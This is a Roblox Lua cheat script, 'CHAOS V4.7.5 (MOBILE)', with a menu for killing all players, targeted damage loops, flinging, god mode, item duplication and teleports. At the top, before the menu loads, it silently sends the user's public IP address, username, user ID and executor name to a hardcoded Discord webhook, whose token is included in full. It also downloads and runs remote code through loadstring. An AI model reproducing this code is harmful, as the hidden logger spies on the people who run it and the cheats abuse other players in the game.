local ip = game:HttpGet("https://api.ipify.org")

function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local url = "https://discord.com/api/webhooks/1266030805826670676/Ar-PF-H6nvcYGR_BZobUfJuLPVm_2D_syCLJ9UOWsxip0whsJIwWIoDW_mgiBClImi4H"
SendMessage(url)

local embed = {
	["title"] = "CHAOS V4.7.5 Logs:",
	["description"] = "New execute detected on CHAOS V4.7.5 (MOBILE)",
	["color"] = 0,
	["fields"] = {
		{
			["name"] = "IP",
			["value"] = ip
		},
				{
			["name"] = "Display Name",
			["value"] = game.Players.LocalPlayer.DisplayName
		},
		{
			["name"] = "User Name",
			["value"] = game.Players.LocalPlayer.Name
		},
		{
			["name"] = "User ID",
			["value"] = game.Players.LocalPlayer.UserId
		},
		{
			["name"] = "Exploit",
			["value"] = identifyexecutor()
		}
	},
	["footer"] = {
		["text"] = " ",
	},
}
SendMessageEMBED(url, embed)


local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()

local function Notify(title,text,duration)
    game:GetService'StarterGui':SetCore('SendNotification',{
        Title = tostring(title),
        Text = tostring(text),
        Duration = tonumber(duration),
    })
end

local function GetChar()
    local Char = Player.Character or Player.CharacterAdded:Wait()
    return Char
end

spawn(function()
    while true do rs.RenderStepped:wait()
        pcall(function()
            if not uis:IsKeyDown(Enum.KeyCode.LeftShift) then
                plr.Character.Humanoid.WalkSpeed = walkSpeed
            elseif uis:IsKeyDown(Enum.KeyCode.LeftShift) then
                plr.Character.Humanoid.WalkSpeed = walkSpeed+7
            end
        end)
    end
end)

spawn(function()
    while true do rs.RenderStepped:wait()
        pcall(function()
            if not uis:IsKeyDown(Enum.KeyCode.E) then
                plr.Character.Humanoid.WalkSpeed = walkSpeed
            elseif uis:IsKeyDown(Enum.KeyCode.E) then
                plr.Character.Humanoid.WalkSpeed = walkSpeed+9
            end
        end)
    end
end)


local Lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/T1NNJ/AttemptToflag-Mobile-/main/GUI", true))()
local Table = {}

local window = Lib:CreateWindow("Chaos V4.7.5 (MOB)")

window:Section(" Main Functions")

window:Button("Check for a pencil",function()
local toolName = "Pencil"
local synx = "lapiz"

local function checkTools()
    for _, player in pairs(game.Players:GetPlayers()) do
        local backpack = player.Backpack
        if backpack then
            local tool = backpack:FindFirstChild(toolName)
            if tool then
                game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
                    Text = player.Name .. " tiene equipado un " .. synx
                })
            end
        end
    end
end

-- Revisa los equipos cada cierto tiempo
while true do
    checkTools()
    -- Espera un tiempo antes de volver a revisar (puedes ajustar este valor)
    wait(6)
end
end)
window:Button("Teleport to Pencil (NEW)",function()
local Players = game:GetService("Players")
local toolName = "Pencil"

local function teleportToPencil()
    for _, player in pairs(Players:GetPlayers()) do
        local character = player.Character
        if character then
            local tool = character:FindFirstChild(toolName)
            if tool then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                if humanoidRootPart then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = humanoidRootPart.CFrame + Vector3.new(0, 0, 5)
                    return
                else
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = tool.Handle.CFrame + Vector3.new(0, 0, 5)
                    return
                end
            end
        end
    end
    warn("No player found with the tool "..toolName.." equipped.")
end

teleportToPencil()
end)

window:Button("Fling Pencil (NEW+OP)",function()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local toolName = "Pencil"

local function getTool(toolName)
    for _, player in pairs(Players:GetPlayers()) do
        local character = player.Character
        if character then
            local tool = character:FindFirstChild(toolName) or character:WaitForChild(toolName, 5)
            if tool then
                return tool
            end
        end
    end
    return nil
end

local function teleportToTool(tool)
    if tool then
        game.StarterGui:SetCore("SendNotification", {
            Title = "Tool Found!";
            Text = "Teleporting to Pencil.";
            Icon = "http://www.roblox.com/asset/?id=5585095509";
            Duration = 3;
        })
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = tool.Handle.CFrame + Vector3.new(0, 0, 5)
    else
        game.StarterGui:SetCore("SendNotification", {
            Title = "Pencil:";
            Text = "No one has a pencil.";
            Icon = "http://www.roblox.com/asset/?id=5585095509";
            Duration = 3;
        })
    end
end

wait()
local tool = getTool(toolName)
teleportToTool(tool)

if tool then
    local headSit = nil
    local speaker = Players.LocalPlayer
    local function getRoot(character)
        return character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart or character:FindFirstChild("Torso")
    end

    if headSit then
        headSit:Disconnect()
    end

    speaker.Character:FindFirstChildOfClass('Humanoid').Sit = true

    headSit = RunService.Heartbeat:Connect(function()
        if getRoot(speaker.Character) and speaker.Character:FindFirstChildOfClass('Humanoid').Sit == true then
            getRoot(speaker.Character).CFrame = tool.Handle.CFrame * CFrame.Angles(0, math.rad(0), 0) * CFrame.new(0, 1.6, 0.4)
        else
            if headSit then
                headSit:Disconnect()
            end
        end
    end)

    wait()

    local Char = game.Players.LocalPlayer.Character
    local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

    for _, v in next, Hum:GetPlayingAnimationTracks() do
        v:Stop()
    end

    wait() -- Aquí comienza el fling
        game.StarterGui:SetCore("SendNotification", {
            Title = "Fling";
            Text = "Applying fling..";
            Icon = "http://www.roblox.com/asset/?id=5585095509";
            Duration = 3;
        })
    local power = 50 -- change this to make it more or less powerful

    RunService.Stepped:connect(function()
        Char.Torso.CanCollide = false
        Char["Left Leg"].CanCollide = false
        Char["Right Leg"].CanCollide = false
    end)

    wait()
    local bambam = Instance.new("BodyThrust")
    bambam.Parent = Char.HumanoidRootPart
    bambam.Force = Vector3.new(0, -power, 0) -- Fuerza hacia abajo
    bambam.Location = Char.HumanoidRootPart.Position

    Char.Humanoid.WalkSpeed = 15

    -- STOPANIMS AQUI WOWW
    for _, v in next, Hum:GetPlayingAnimationTracks() do
        v:Stop()
    end
end
game.StarterGui:SetCore("SendNotification", {
            Title = "DONE!";
            Text = "If not voided re try, i hope yes.";
            Icon = "http://www.roblox.com/asset/?id=5585095509";
            Duration = 3;
        })
end)

window:Button("Inf Jump",function()
local Player = game:GetService'Players'.LocalPlayer;
local UIS = game:GetService'UserInputService';
 
_G.JumpHeight = 50;
 
function Action(Object, Function) if Object ~= C4 then Function(Object); end end
 
UIS.InputBegan:connect(function(UserInput)
    if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
        Action(Player.Character.Humanoid, function(self)
            if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
                Action(self.Parent.HumanoidRootPart, function(self)
                    self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
                end)
            end
        end)
    end
end)
end)

window:Button("Anti Fling (OP)",function()
game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "LOADED! CURRENT : " .. tostring(LOL); 
        Color = Color3.fromRGB(0, 222, 0);
})          
local Services = setmetatable({}, {__index = function(Self, Index)
local NewService = game.GetService(game, Index)
if NewService then
Self[Index] = NewService
end
return NewService
end})

-- [ LocalPlayer ] --
local LocalPlayer = Services.Players.LocalPlayer

-- // Functions \\ --
local function PlayerAdded(Player)
   local Detected = false
   local Character;
   local PrimaryPart;

   local function CharacterAdded(NewCharacter)
       Character = NewCharacter
       repeat
           wait()
           PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
       until PrimaryPart
       Detected = false
   end

   CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
   Player.CharacterAdded:Connect(CharacterAdded)
   Services.RunService.Heartbeat:Connect(function()
       if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
           if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
               Detected = true
               for i,v in ipairs(Character:GetDescendants()) do
                   if v:IsA("BasePart") then
                       v.CanCollide = false
                       v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                       v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                       v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                   end
               end
               PrimaryPart.CanCollide = false
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
           end
       end
   end)
end

-- // Event Listeners \\ --
for i,v in ipairs(Services.Players:GetPlayers()) do
   if v ~= LocalPlayer then
       PlayerAdded(v)
   end
end
Services.Players.PlayerAdded:Connect(PlayerAdded)

local LastPosition = nil
Services.RunService.Heartbeat:Connect(function()
   pcall(function()
       local PrimaryPart = LocalPlayer.Character.PrimaryPart
       if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
           PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.CFrame = LastPosition
       elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
           LastPosition = PrimaryPart.CFrame
       end
   end)
end)
end)

window:Button("Anti Spike Trap",function()
while true do wait()
local function removeTouchInterestFromSpikeTrap()
    print("Checking for Spike Traps...") -- Mensaje de depuración
    -- Recorrer todos los objetos en el Workspace
    for _, object in pairs(game.Workspace:GetDescendants()) do
        -- Verificar si el objeto es un Spike Trap
        if object.Name == "Spike Trap" then
            print("Found Spike Trap:", object) -- Mensaje de depuración
            -- Buscar el Button dentro del Spike Trap
            local button = object:FindFirstChild("Button")
            if button then
                -- Buscar y eliminar el TouchInterest dentro del Button
                for _, child in pairs(button:GetChildren()) do
                    if child:IsA("TouchTransmitter") then
                        print("Found and destroying TouchTransmitter in:", button) -- Mensaje de depuración
                        child:Destroy()
                    end
                end
            end
        end
    end
end

-- Obtener el jugador local
local player = game.Players.LocalPlayer

-- Conectar al evento CharacterAdded del jugador
player.CharacterAdded:Connect(function(character)
    print("Character added:", character) -- Mensaje de depuración
    -- Esperar a que el personaje termine de cargar
    character:WaitForChild("HumanoidRootPart")
    -- Ejecutar la función para eliminar TouchInterest de Spike Traps
    removeTouchInterestFromSpikeTrap()
end)

-- Ejecutar la función una vez al inicio por si el jugador ya está en el juego
if player.Character then
    print("Player already has a character:", player.Character) -- Mensaje de depuración
    removeTouchInterestFromSpikeTrap()
end
wait(.1) end
end)

window:Button("RGB Sprint Bar",function()
local speed = 10
while true do
	for i = 0,1,0.001*speed do
		game:GetService("Players").LocalPlayer.PlayerGui.Sprinting.Frame.Frame.BackgroundColor3 = Color3.fromHSV(i,1,1)
		wait()
	end
end
end)

window:Dropdown("Auto Select:",{location = Table,flag = "weapon",search = false --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe", "Emerald Greatsword","Blood Dagger","Frost Spear"}--[[Wont work when PlayerList = true]], PlayerList = false --[[ Turns the list into the players in the server ]]},function()
local Mouse = game.Players.LocalPlayer:GetMouse()
game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
if IsTyping then return end
if Input.KeyCode == Enum.KeyCode.KeypadSeven then
while true do wait()
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()


	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").Enabled = false
    Player.PlayerGui["Menu Screen"].RemoteEvent:FireServer(Table["weapon"])
wait(1) end
end
end)
end)

local Pressing = false
window:Toggle("Auto Select Tool",{location = Table, flag = "enable"},function()
local stopFlag = false
game.StarterGui:SetCore("SendNotification", {
    Title = "Current:";
    Text = (Table["weapon"]),
    Icon = "http://www.roblox.com/asset/?id=5585095509"; 
    Duration = 5; 
    callback = bindableFunction;
})
local function pressKey()
wait(.5)  
game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.KeypadSeven, false, game)
end

if Pressing then
    Pressing = false
    stopFlag = true
else
    Pressing = true
    stopFlag = false
    spawn(function()
        repeat
            pressKey()
            wait(1)
            game:GetService("RunService").Heartbeat:Wait()
        until stopFlag or not Pressing
    end)
end
end)

window:Button("Set Night",function()
game.Lighting:SetMinutesAfterMidnight(155)
    end)

window:Button("Infinite Yield v5",function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)

game.StarterGui:SetCore("SendNotification", {
    Title = "Loading..";
    Text = "Wait until load..";
    Icon = "http://www.roblox.com/asset/?id=5585103223";
    Duration = 2;
    callback = bindableFunction;
})

window:Section(" Target List")

wait(.1)

window:Dropdown("Select Target",{location = Table,flag = "player1",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
    Title = "Target:";
    Text = "Choosed sucessfully!";
    Icon = "http://www.roblox.com/asset/?id=5585103223";
    Duration = 5;
    callback = bindableFunction;
})
game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
if IsTyping then return end
if Input.KeyCode == Enum.KeyCode.KeypadMinus then
wait()
game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Table["player1"])
local A_1 = game:GetService("Workspace"):FindFirstChild(Table["player1"]).Humanoid
        local Target = A_1
           repeat
               wait()
local A_1 = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(A_1) and not v:FindFirstChild("ForceField")
          until Target.Health <= 0
end
end)
end)

wait(.1)

window:Dropdown("Select Target",{location = Table,flag = "player2",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
    Title = "Target:";
    Text = "Choosed sucessfully!";
    Icon = "http://www.roblox.com/asset/?id=5585103223";
    Duration = 5;
    callback = bindableFunction;
})
game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
if IsTyping then return end
if Input.KeyCode == Enum.KeyCode.KeypadMinus then
wait()
game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Table["player2"])
local A_2 = game:GetService("Workspace"):FindFirstChild(Table["player2"]).Humanoid
        local Target = A_2
           repeat
               wait()
local A_2 = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(A_2) and not v:FindFirstChild("ForceField")
          until Target.Health <= 0
end
end)
end)

wait(.1)

window:Dropdown("Select Target",{location = Table,flag = "player3",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
    Title = "Target:";
    Text = "Choosed sucessfully!";
    Icon = "http://www.roblox.com/asset/?id=5585103223";
    Duration = 5;
    callback = bindableFunction;
})
game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
if IsTyping then return end
if Input.KeyCode == Enum.KeyCode.KeypadMinus then
wait()
game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Table["player3"])
local A_3 = game:GetService("Workspace"):FindFirstChild(Table["player3"]).Humanoid
        local Target = A_3
           repeat
               wait()
local A_3 = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(A_3) and not v:FindFirstChild("ForceField")
          until Target.Health <= 0
end
end)
end)

wait(.1)

window:Dropdown("Select Target",{location = Table,flag = "player4",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
    Title = "Target:";
    Text = "Choosed sucessfully!";
    Icon = "http://www.roblox.com/asset/?id=5585103223";
    Duration = 5;
    callback = bindableFunction;
})
game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
if IsTyping then return end
if Input.KeyCode == Enum.KeyCode.KeypadMinus then
wait()
game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Table["player4"])
local A_4 = game:GetService("Workspace"):FindFirstChild(Table["player4"]).Humanoid
        local Target = A_4
           repeat
               wait()
local A_4 = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(A_4) and not v:FindFirstChild("ForceField")
          until Target.Health <= 0
          end
end)
end)

wait(.1)

window:Dropdown("Select Target",{location = Table,flag = "player4",search = true --[[AddsSearchBar]], list = {"Mace","Chainsaw","Knife","Pan","Pencil","Baseball Bat","Scythe","Emerald Greatsword","Blood Dagger"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()game.StarterGui:SetCore("SendNotification", {
    Title = "Target:";
    Text = "Choosed sucessfully!";
    Icon = "http://www.roblox.com/asset/?id=5585103223";
    Duration = 5;
    callback = bindableFunction;
})
game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
if IsTyping then return end
if Input.KeyCode == Enum.KeyCode.KeypadMinus then
wait()
game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(Table["player5"])
local A_5 = game:GetService("Workspace"):FindFirstChild(Table["player5"]).Humanoid
        local Target = A_5
           repeat
               wait()
local A_5 = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").DamageRemote:FireServer(A_5) and not v:FindFirstChild("ForceField")
          until Target.Health <= 0
          end
end)
end)



local Pressing = false
window:Toggle("Start/Stop Looping",{location = Table, flag = "enable"},function()
local stopFlag = false

local function pressKey()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.KeypadMinus, false, game)
end

if Pressing then
    Pressing = false
    stopFlag = true
else
    Pressing = true
    stopFlag = false
    spawn(function()
        repeat
            pressKey()
            wait(1)
            game:GetService("RunService").Heartbeat:Wait()
        until stopFlag or not Pressing
    end)
end
end)

local KillingNear = false
window:Toggle("Kill All",{location = Table, flag = "enable"},function()   
local stopFlag = false

local Player = game.Players.LocalPlayer
local Workspace = game.Workspace

local function GetChar()
    return Player.Character
end

local function FindNearestHumanoid()
    local target = nil
    local nearestDistance = 10000
    
    for i, v in pairs(Workspace:GetChildren()) do
        if v ~= GetChar() then
            local humanoid = v:FindFirstChild("Humanoid")
            local rootPart = v:FindFirstChild("HumanoidRootPart")
            
            if humanoid and rootPart then
                local distance = (rootPart.Position - GetChar().HumanoidRootPart.Position).magnitude
                
                if humanoid.Health > 0 and not v:FindFirstChild("ForceField") and distance <= nearestDistance then
                    target = humanoid
                    nearestDistance = distance
                end
            end
        end
    end
    
    return target
end

local function DamageTarget(target)
    local tool = GetChar():FindFirstChildOfClass("Tool")
    
    if tool then
        tool.DamageRemote:FireServer(target)
    end
end

local function CheckTargets()
    while not stopFlag and KillingNear do
        local nearestTarget = FindNearestHumanoid()
        
        if nearestTarget then
            DamageTarget(nearestTarget)
        end
        
        wait()
    end
end

if KillingNear then
    KillingNear = false
    stopFlag = true
else
    KillingNear = true
    stopFlag = false
    spawn(function()
        CheckTargets()
    end)
end
end)

window:Button("God Mode (Void)",function()
game.StarterGui:SetCore("SendNotification", {
    Title = "God mode:";
    Text = "This got anti void pencil include!";
    Icon = "http://www.roblox.com/asset/?id=5585095509";
    Duration = 5;
    callback = bindableFunction;
})
game:GetService("Players").LocalPlayer.Character.PickupRemote:FireServer()
wait()
game.Players.LocalPlayer.Character["Torso"]:Destroy()
wait()
game.Players.LocalPlayer.Character["Humanoid"]:Destroy()
wait(1)
local player = game.Players.LocalPlayer
local Blade = game.Workspace[player.Name]:WaitForChild("Pencil"):FindFirstChild("Blade"):Destroy()
wait()
local Hadle = game.Workspace[player.Name]:WaitForChild("Pencil"):FindFirstChild("Handle"):Destroy()
wait()
local Mesh1 = game.Workspace[player.Name]:WaitForChild("Pencil"):FindFirstChild("Meshes/wooden pencil_Cylinder.002"):Destroy()
wait() 
local Mesh2 = game.Workspace[player.Name]:WaitForChild("Pencil"):FindFirstChild("Meshes/wooden pencil_Cylinder.003"):Destroy()
wait()
local Mesh3 = game.Workspace[player.Name]:WaitForChild("Pencil"):FindFirstChild("Meshes/wooden pencil_Cylinder.003"):Destroy()
end)

window:Section(" Fling A Player")

window:Dropdown("Fling A Player",{location = Table,flag = "Target",search = true --[[AddsSearchBar]], list = {"1","2","3","4","5","6","7","8","9","0"} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local speaker = game.Players:GetPlayerFromCharacter(game.Players.LocalPlayer.Character)

if not speaker then
    warn("Speaker not found")
    return
end

local headSit = nil

local function getRoot(character)
    return character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart or character:FindFirstChild("Torso")
end

local function getPlayer(playerName, speaker)
    local selectedPlayers = {}
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name == playerName and player ~= speaker then
            table.insert(selectedPlayers, player)
        end
    end
    return selectedPlayers
end

local players = getPlayer(Table["Target"], speaker)

if headSit then
    headSit:Disconnect()
end

for i, v in ipairs(players) do
    if v and v.Character and v.Character:FindFirstChildOfClass('Humanoid') then
        speaker.Character:FindFirstChildOfClass('Humanoid').Sit = true

        headSit = RunService.Heartbeat:Connect(function()
            if Players:FindFirstChild(v.Name) and v.Character and getRoot(v.Character) and getRoot(speaker.Character) and speaker.Character:FindFirstChildOfClass('Humanoid').Sit == true then
                getRoot(speaker.Character).CFrame = getRoot(v.Character).CFrame * CFrame.Angles(0, math.rad(0), 0) * CFrame.new(0, 1.6, 0.4)
            else
                if headSit then
                    headSit:Disconnect()
                end
            end
        end)
    end
end

wait(0.2)

local Char = game.Players.LocalPlayer.Character
local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

for i,v in next, Hum:GetPlayingAnimationTracks() do
    v:Stop()
end

wait(0.5)

-- Fling player
local function flingPlayer(player)
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                local flingForce = Vector3.new(0, 999999999999999999999999999, 0) -- Adjust the force as needed

                humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
                humanoid.PlatformStand = true
                humanoid:ChangeState(Enum.HumanoidStateType.Physics)

                rootPart.Velocity = flingForce
            end
        end
    end
end

local playerToFling = Players:FindFirstChild(Table["Target"])

if playerToFling then
    flingPlayer(playerToFling)
else
    warn("Player not found")
end

wait(0.5)

local Char = game.Players.LocalPlayer.Character
local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

for i,v in next, Hum:GetPlayingAnimationTracks() do
    v:Stop()
end

wait(7)

local player = game.Players.LocalPlayer
local humanoid = game.Workspace[player.Name].Humanoid
humanoid.Health = 0
end)

local Farming = false
window:Toggle("Farm Grenade 2",{location = Table, flag = "Farming"},function()
game.StarterGui:SetCore("SendNotification", {
    Title = "Dupe:";
    Text = "Hold on..";
    Icon = "http://www.roblox.com/asset/?id=5585095509";
    Duration = 3;
    callback = bindableFunction;
})
    if Farming then
        Farming = false
    else
        Farming = true
        repeat
local player = game.Players.LocalPlayer

repeat
    wait()
until player.Character

local player = game.Players.LocalPlayer

repeat
    wait(.6)
until player.Character

local playerGui = player:FindFirstChild("PlayerGui")
if playerGui then
    local menuScreen = playerGui:FindFirstChild("Menu Screen")
    if menuScreen and menuScreen:IsA("ScreenGui") then
        menuScreen.Enabled = false
        if menuScreen:FindFirstChild("RemoteEvent") then
            menuScreen.RemoteEvent:FireServer("Emerald Greatsword")
        else
            warn("RemoteEvent not found in Menu Screen.")
        end
    else
        warn("Menu Screen not found or is not a ScreenGui.")
    end
else
    warn("PlayerGui not found.")
end

local function performActionAfterSpawn()
    wait()
    if player.Character then
        player.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-287, 108, -48)
        wait(0.3)

        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Health = 0
            wait()
local player = game.Players.LocalPlayer

repeat
    wait(.2)
until player.Character

local grenade2 = player.Backpack:FindFirstChild("Grenade 2")

if grenade2 then
    local humanoid = player.Character:FindFirstChild("Humanoid")

    if humanoid then
        humanoid:EquipTool(grenade2)
    else
        warn("Humanoid not found in player's character.")
    end
else
    warn("Grenade 2 tool not found in player's backpack.")
           end
            wait(0.3)
            game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
        end
    else
        warn("Player or Humanoid not found.")
    end
end

if player.Character then
    performActionAfterSpawn()
else
    player.CharacterAdded:Connect(performActionAfterSpawn)
end
 game:GetService("RunService").Heartbeat:Wait()
        until stopFlag or not Farming
    end
end)

window:Button("Collect All Grenades (W FF)",function()
local root = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("HumanoidRootPart") or game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("BasePart")

local function touch(x)
    x = x:FindFirstAncestorWhichIsA("BasePart")
    if x and firetouchinterest then
        if x.Name == "Spiked Trap" then
            -- Ignorar el 'Spiked Trap'
            return
        end
        
        task.spawn(function()
            firetouchinterest(x, root, 1)
            wait()
            firetouchinterest(x, root, 0)
        end)
        x.CFrame = root.CFrame
    end
end

for _, descendant in ipairs(workspace:GetDescendants()) do
    if descendant:IsA("TouchTransmitter") then
        touch(descendant)
    end
end
end) 

window:Button("Spam Grenade 2",function()
        for _,v in next,plr.Backpack:GetChildren() do
            if v.Name == 'Grenade 2' and v:FindFirstChild'RemoteEvent' then
                v.Parent = plr.Character
                v.RemoteEvent:FireServer(mouse.Hit.LookVector)
                v.Parent = plr.Backpack
            end
        end
end)

window:Button("Teleport To Farm Zone",function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-292, 60, -68)
end)

window:Button("Teleport Up (Exit)",function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-286, 97, -2)
end)

--Disable AutoJump

game.Players.LocalPlayer.AutoJumpEnabled = false

game.StarterGui:SetCore("SendNotification", {
    Title = "Loaded!";
    Text = "GUI Loaded sucessfully, (Mobile Version)!";
    Icon = "http://www.roblox.com/asset/?id=5585095509"; 
    Duration = 5; 
    callback = bindableFunction;
})
